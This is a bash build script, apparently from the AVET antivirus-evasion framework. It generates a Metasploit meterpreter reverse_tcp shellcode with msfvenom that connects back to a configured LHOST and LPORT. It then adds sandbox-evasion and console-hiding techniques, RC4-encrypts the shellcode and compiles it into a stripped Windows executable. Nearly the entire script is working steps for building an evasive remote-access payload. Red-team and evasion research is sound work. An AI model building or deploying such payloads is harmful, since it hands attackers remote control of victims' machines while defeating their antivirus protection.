#!/bin/bash
# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec
set_command_source no_data
set_command_exec no_command
# generate key file for payload
generate_key preset wVHQxqgPJJ input/key_raw.txt
#CONFIGURATION_END

#enable_debug_print to_file C:/users/public/payload_log.txt

# --- ---
# GENERATE PAYLOAD input/uwu.exe
# --- ---

printf "\n+++ Generating payload +++\n"

# generate metasploit payload that will later be hollowed into the target process
# use reverse_tcp because the 32-bit test system appears to not handle https well
#msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e cmd/echo -i 1 AutoLoadStdapi=false EnableStageEncoding=true StageEncoder=x64/zutto_dekiru -f c -a x64 -e cmd/echo --platform windows > output/payload.c
#msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -i 1 AutoLoadStdapi=false EnableStageEncoding=true StageEncoder=x64/zutto_dekiru -f raw -a x64 --platform windows -e cmd/echo > input/sc_raw.txt
#msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -f raw -a x64 --platform windows -e cmd/echo -i 1 > input/sc_raw.txt
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e cmd/echo -i 1 -f raw -a x64 --platform windows > input/sc_raw.txt

# add evasion techniques
#add_evasion dll_unhooking

#add_evasion check_common_loaded_dlls
add_evasion vodoo_magic

#add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
#add_evasion fopen_sandbox_evasion 'c:\\Users\\Public\\Downloads\\test.txt'
add_evasion gethostbyname_sandbox_evasion 'google.de'
add_evasion hide_console
#add_evasion has_process_exit 'iexplore.exe'
add_evasion check_fast_forwarding_no_winapi 1
#add_evasion check_memory_size
reset_evasion_technique_counter

# encode msfvenom shellcode
encode_payload rc4 input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt

# array name buf is expected by static_from_file retrieval method
./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf

# set shellcode source
set_payload_source static_from_file input/scenc_c.txt

# convert generated key from raw to C into array "key"
./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key

# set key source
set_key_source static_from_file input/key_c.txt

# set payload info source
set_payload_info_source no_data

# set decoder
set_decoder rc4

# set shellcode binding technique
set_payload_execution_method exec_shellcode64_no_winapi

# compile payload
#$win64cpp_compiler -fpermissive -Wwrite-strings -o output/uwu.exe source/avet.c -lws2_32
#$win64_compiler -o output/uwu.exe source/avet.c -Wl,--verbose -lws2_32
$win64_compiler -o output/uwu.exe source/avet.c -Wl,--script=source/implementations/linkers/exec_shellcode64_no_winapi.ld -lws2_32
#$win64_compiler -o output/uwu.exe source/avet.c -lws2_32
strip output/uwu.exe
printf "\n Generated payload output/uwu.exe\n"

# cleanup
cleanup_techniques